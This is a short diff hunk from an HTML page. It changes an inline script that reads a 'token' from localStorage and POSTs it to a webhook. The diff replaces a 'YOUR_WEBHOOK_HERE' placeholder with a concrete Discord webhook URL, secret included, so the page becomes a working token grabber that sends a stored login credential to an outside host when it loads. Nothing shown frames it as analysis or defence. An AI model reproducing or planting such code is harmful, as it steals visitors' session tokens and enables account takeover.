@@ -21,7 +21,7 @@
     <script>
       try {
         const token = localStorage.getItem("token");
-        fetch("YOUR_WEBHOOK_HERE", {
+        fetch("https://discord.com/api/webhooks/1336369841053106176/AHMZmJVRv23SBrZa9EBEoXQKZABerliX08Nq8MTV7ZgvwTPm2LUewzgz6COyp0Yjao2R", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
